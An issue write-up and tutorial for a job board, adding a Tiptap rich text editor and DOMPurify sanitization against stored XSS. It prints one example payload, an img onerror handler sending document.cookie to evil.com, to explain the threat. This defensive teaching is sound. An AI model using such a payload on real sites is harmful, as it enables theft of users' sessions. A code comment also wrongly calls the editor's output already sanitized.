# Issue #36 — No Rich Text Editor for Job Descriptions

> **Branch**: 5 (UI/UX Polish)  
> **Severity**: 🟤 UX — recruiters can't format job descriptions; everything is a wall of text  
> **Status**: Branch 5 (pending)

---

## 👥 The Team Room

*A recruiter is trying to post a job with bullet points.*

---

**👩‍💼 Recruiter:** "How do I add bullet points to my job description? I can only type plain text."

**🔵 Fay (Frontend):** "Currently there's a plain `<textarea>`. No formatting at all."

**🔴 Priya (PM):** "Every other job board lets you use bold, bullet points, headers. Our job descriptions look like raw paragraphs. Candidates struggle to scan them."

**🔵 Fay:** "We need a rich text editor. Tiptap is a good choice — built on ProseMirror, React-friendly, open source, extensible."

**🟣 Sam (Security):** "And when we store HTML from a rich text editor, we need to sanitize it before displaying it to prevent XSS."

---

## 🔍 The Security Concern with Rich Text

If a recruiter can input HTML, and that HTML is stored in the database and rendered in other users' browsers, a malicious recruiter could input:
```html
<img src="x" onerror="document.cookie='stolen='+document.cookie; fetch('https://evil.com?c='+document.cookie)">
```

This would steal every job seeker's session cookie when they view the job listing. This is a **Stored XSS** attack.

**The fix**: sanitize HTML on the server before storing, and sanitize again before displaying.

---

## 🛠 The Fix (to implement in Branch 5)

### Step 1: Install Tiptap

```bash
cd frontend && npm install @tiptap/react @tiptap/pm @tiptap/starter-kit @tiptap/extension-image
```

### Step 2: Create Rich Text Editor Component

```jsx
// frontend/src/components/RichTextEditor.jsx
import { useEditor, EditorContent } from "@tiptap/react";
import StarterKit from "@tiptap/starter-kit";

export default function RichTextEditor({ value, onChange, placeholder }) {
  const editor = useEditor({
    extensions: [
      StarterKit.configure({
        // Enable: paragraph, bold, italic, bulletList, orderedList, heading, blockquote, code
        heading: { levels: [2, 3] }, // Allow H2 and H3
      }),
    ],
    content: value || "",
    onUpdate: ({ editor }) => {
      onChange(editor.getHTML()); // Returns sanitized HTML
    },
  });
  
  if (!editor) return null;
  
  return (
    <div className="rich-editor">
      {/* Formatting toolbar */}
      <div className="editor-toolbar">
        <button
          type="button"
          onClick={() => editor.chain().focus().toggleBold().run()}
          className={editor.isActive("bold") ? "active" : ""}
          title="Bold"
        >
          <strong>B</strong>
        </button>
        <button
          type="button"
          onClick={() => editor.chain().focus().toggleItalic().run()}
          className={editor.isActive("italic") ? "active" : ""}
          title="Italic"
        >
          <em>I</em>
        </button>
        <button
          type="button"
          onClick={() => editor.chain().focus().toggleBulletList().run()}
          className={editor.isActive("bulletList") ? "active" : ""}
          title="Bullet list"
        >
          • List
        </button>
        <button
          type="button"
          onClick={() => editor.chain().focus().toggleOrderedList().run()}
          className={editor.isActive("orderedList") ? "active" : ""}
          title="Numbered list"
        >
          1. List
        </button>
        <button
          type="button"
          onClick={() => editor.chain().focus().toggleHeading({ level: 2 }).run()}
          className={editor.isActive("heading", { level: 2 }) ? "active" : ""}
          title="Heading"
        >
          H2
        </button>
      </div>
      
      {/* Editor area */}
      <EditorContent
        editor={editor}
        className="editor-content"
        style={{ minHeight: "200px", padding: "12px" }}
      />
    </div>
  );
}
```

### Step 3: Use in PostJob Form

```jsx
// frontend/src/pages/PostJob.jsx
import RichTextEditor from "../components/RichTextEditor";

// Replace:
// <textarea value={description} onChange={(e) => setDescription(e.target.value)} />

// With:
<RichTextEditor
  value={description}
  onChange={setDescription}
  placeholder="Describe the role, responsibilities, and what you're looking for..."
/>
```

The `description` state will now contain HTML like:
```html
<h2>About the Role</h2>
<p>We are looking for a <strong>senior React developer</strong>.</p>
<ul>
  <li>5+ years React experience</li>
  <li>Node.js backend skills</li>
</ul>
```

### Step 4: Sanitize on the Backend Before Saving

```bash
cd backend && npm install dompurify jsdom
```

```js
// backend/routes/jobRoutes.js — before saving the job:
const createDOMPurify = require("dompurify");
const { JSDOM } = require("jsdom");

const window = new JSDOM("").window;
const DOMPurify = createDOMPurify(window);

// Allowed HTML tags and attributes for job descriptions:
const sanitizeJobDescription = (dirty) => {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ["p", "br", "strong", "em", "ul", "ol", "li", "h2", "h3", "blockquote", "code", "a"],
    ALLOWED_ATTR: ["href", "target"], // Only allow href on <a> tags
  });
};

router.post("/", verifyToken, async (req, res) => {
  const { title, company, description, ...rest } = req.body;
  
  const cleanDescription = sanitizeJobDescription(description);
  
  const job = new Job({
    title,
    company,
    description: cleanDescription, // Store sanitized HTML
    ...rest,
    postedBy: req.user.id,
  });
  
  await job.save();
  res.status(201).json(job);
});
```

### Step 5: Render Safely on Frontend

```jsx
// In job detail view / recruiter dashboard:
// ❌ Bad — renders unsanitized HTML:
<div dangerouslySetInnerHTML={{ __html: job.description }} />

// ✅ Good — the HTML was sanitized before storage, but double-sanitize on display:
import DOMPurify from "dompurify";

<div
  className="job-description rich-text"
  dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(job.description) }}
/>
```

The CSS for `rich-text`:
```css
.rich-text h2 { font-size: 1.25rem; font-weight: 600; margin: 1rem 0 0.5rem; }
.rich-text h3 { font-size: 1.1rem; font-weight: 600; margin: 0.75rem 0 0.25rem; }
.rich-text ul { list-style: disc; padding-left: 1.5rem; margin: 0.5rem 0; }
.rich-text ol { list-style: decimal; padding-left: 1.5rem; margin: 0.5rem 0; }
.rich-text li { margin: 0.25rem 0; }
.rich-text p { margin: 0.5rem 0; }
.rich-text strong { font-weight: 600; }
```

---

## ❓ Common Questions

**Q: What is `dangerouslySetInnerHTML`? Why is it "dangerous"?**  
A: It injects HTML directly into the DOM. Without sanitization, an attacker could inject JavaScript via `<script>` tags or event handlers. The name is a reminder: always sanitize before using it. DOMPurify removes all dangerous content.

**Q: Why sanitize on the backend AND frontend?**  
A: Defense in depth. Backend sanitization ensures stored data is clean. Frontend sanitization protects against cases where old (pre-sanitization) data is rendered, or if a backend bug somehow lets unsanitized data through.

**Q: Can I use Quill.js or other editors instead of Tiptap?**  
A: Yes. Other options: Quill.js (older, widely used), Lexical (Facebook's editor), react-quill. Tiptap is recommended because it's modern, TypeScript-friendly, and highly customizable.

---

## 🎓 What You Learned

- Rich text editors output HTML — you must sanitize it before storing or rendering
- **Stored XSS**: injected HTML saved in your database that executes in every viewer's browser
- DOMPurify is the standard HTML sanitizer — strips `<script>`, event handlers, dangerous attributes
- Sanitize on the server (before storage) AND on the client (before rendering) — two layers
- `dangerouslySetInnerHTML` is React's signal that you're doing something risky — use it only with sanitized content
